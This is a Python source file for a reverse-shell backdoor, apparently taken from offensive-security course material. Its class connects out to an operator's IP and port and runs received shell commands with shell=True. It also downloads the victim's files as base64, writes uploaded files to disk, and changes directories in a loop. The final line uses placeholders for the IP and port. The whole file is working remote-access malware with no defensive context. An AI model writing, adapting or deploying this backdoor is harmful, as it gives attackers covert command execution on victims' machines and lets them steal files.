#!/usr/bin/env python3

import socket
import subprocess
import json
import os
import base64  

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return e.output

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")  

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  
            return "[+] Upload successful"


    def change_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except FileNotFoundError:
            return "[!] Directory not found: " + path

    def run(self):
        while True:
            command = self.reliable_receive() 
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(" ".join(command))
                    command_result = command_result.decode("utf-8", errors="ignore")
            except Exception:
                command_result = "[-] Error during execution"

            self.reliable_send(command_result)


my_backdoor = Backdoor("local ip", port)
my_backdoor.run()
